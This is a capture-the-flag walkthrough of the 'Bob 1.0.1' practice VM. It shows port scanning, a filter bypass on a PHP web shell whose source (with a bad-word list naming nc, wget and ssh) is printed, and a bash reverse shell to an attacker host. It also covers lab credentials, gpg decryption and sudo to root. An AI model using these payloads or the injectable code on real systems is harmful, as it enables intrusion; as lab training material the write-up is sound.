# Bob-1.0.1-Walkthrough

### Information Gathering
Apache server running on 80
Secret ssh running on 25468


### Service Enumeration
Nmap scan results:
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
| http-robots.txt: 4 disallowed entries 
| /login.php /dev_shell.php /lat_memo.html 
|_/passwords.html
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
25468/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCt2rmQKSTx+fbTOy3a0DG0GI5KOP+x81YHI31kH8V+gXu+BhrvzTtvQbg/KUaxkxNXirQKm3v23b/BNGLm2EmG28T8H1kisT5LhmfJ+w1X/Y7xnXiTYxwxKWF8NHMsQGIKWB8bCPK+2LvG3MdF6cKniSIiT8C8N66F6yTPQyuW9z68pK7Zj4wm0nrkvQ9Mr++Kj4A4WIhxaYd0+hPnSUNIGLr+XC7mRVUtDSvfP0RqguibeQ2yoB974ZTF0uU0Zpq7BK8/loAl4nFu/6vwLU7BjYm3BlU3fvjDNlSwqbsjwgn/kTfySxZ/WiifZW3U1WLLdY4CQZ++nR2odDNy8YQb
|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIntdI8IcX2n63A3tEIasPt0W0Lg31IAVGyzesYMblJsc1zM1jmaJ9d6w6PpZKa+7Ow/5yXX2DOF03pAHXP1S5A=
|   256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMmbgZpOuy0D5idStSgBUVb4JjRuAdv/7XF5dGDJgUqE
MAC Address: 08:00:27:89:7A:38 (Oracle VirtualBox virtual NIC)
```


### Initial Exploitation


Explanation:
Navigating to robots.txt I discovered some directories:
`User-agent: *
Disallow: /login.php
Disallow: /dev_shell.php
Disallow: /lat_memo.html
Disallow: /passwords.html`

Navigating to /dev_shell.php it seems that we have a live shell to run commands on the system. You will notice that there is some filtering going on that we need to bypass. Running `dir` we get a directory listing. The file `dev_shell.php.bak` may give us some useful information about the current page we are using. Naviate to /dev_shell.php.bak in the browser and download the file. After examining the file we can see the underlying php code that is filtering our input. It has an array of bad words that it checks for and doesn't allow semicolons. 


vulnerable php code:
```php
<?php
    //init
    $invalid = 0;
    $command = ($_POST['in_command']);
    $bad_words = array("pwd", "ls", "netcat", "ssh", "wget", "ping", "traceroute", "cat", "nc");
?>
<?php
    system("running command...");
      //executes system Command
      //checks for sneaky ;
      if (strpos($command, ';') !==false){
        system("echo Nice try skid, but you will never get through this bulletproof php code"); //doesn't work :P
      }
      else{
        $is_he_a_bad_man = explode(' ', trim($command)); // cat /etc/passwd
        //checks for dangerous commands
        if (in_array($is_he_a_bad_man[0], $bad_words)){
          system("echo Get out skid lol");
        }
        else{
          system($_POST['in_command']);
        }
      }
?>
```

> All we have to do is use a payload that doesn't contain any words from the array or any semicolons. I used a bash reverse shell and it worked just fine.

Proof of Concept:
```bash
bash -c 'exec bash -i &>/dev/tcp/<attacker IP>/<attacker PORT> <&1'
```


### Privilege Escalation
Vulnerability Explanation:
In bobs home directory found old password file. Enumerating all home directories of users we end up getting more credentials:
`jc:	Qwerty
seb:	T1tanium_Pa$$word_Hack3rs_Fear_M3
elliot:	theadminisdumb
`


#### Root

Root access explanation:
To get root access you must find bobs password. This was a sticking point and I had to peek at a walkthrough. Once I saw I felt find about it because there was no way I was guessing this... You had to look at the script in bobs home directory and take the first letter of each line echoed out to create a passphrase. That passphrase is then used to decrypt login.txt.gpg which contains bobs password.

notes.sh:
```bash
#!/bin/bash
clear
echo "-= Notes =-"
echo "Harry Potter is my faviorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
```
Using the following command you can then decrypt the file.

```bash
jc@Milburg-High:/home/bob/Documents$ gpg --batch --passphrase HARPOCRATES -d login.txt.gpg 
gpg: AES encrypted data
gpg: encrypted with 1 passphrase
bob:b0bcat_
```

Bob can run sudo on all commands so switching to root is simple.
Switch to bob:
```bash
bob@Milburg-High:~/Documents$ sudo su
sudo: unable to resolve host Milburg-High
root@Milburg-High:/home/bob/Documents# cat /flag.txt
CONGRATS ON GAINING ROOT

        .-.
       (   )
        |~|       _.--._
        |~|~:'--~'      |
        | | :   #root   |
        | | :     _.--._|
        |~|~`'--~'
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
   _____|_|_________ Thanks for playing ~c0rruptedb1t
```
